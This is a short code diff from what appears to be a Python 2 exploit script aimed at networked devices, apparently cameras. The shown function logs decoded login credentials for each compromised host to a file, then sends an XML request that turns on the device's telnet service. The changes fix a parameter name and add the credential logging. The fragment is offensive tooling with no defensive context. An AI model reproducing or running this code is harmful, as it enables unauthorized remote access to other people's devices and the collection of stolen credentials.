@@ -60,9 +60,13 @@ def detect_system(host):
 			print "[*] Older Model"
 			return path
 
-def enable_telnetd(header,apth):
+def enable_telnetd(header,path):
 	global host
 	try:
+		text_file = open("found.txt", "a")
+		login_details = base64.b64decode(header)
+		text_file.write("Host: "+host+" Combo:"+login_details+"- \n")
+		text_file.close()
 		print "[*] Enabling telnetd"
 		baseURL = "http://"+host+""+path+"Network/telnetd"
 		data = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><Telnetd><enabled>true</enabled></Telnetd>"
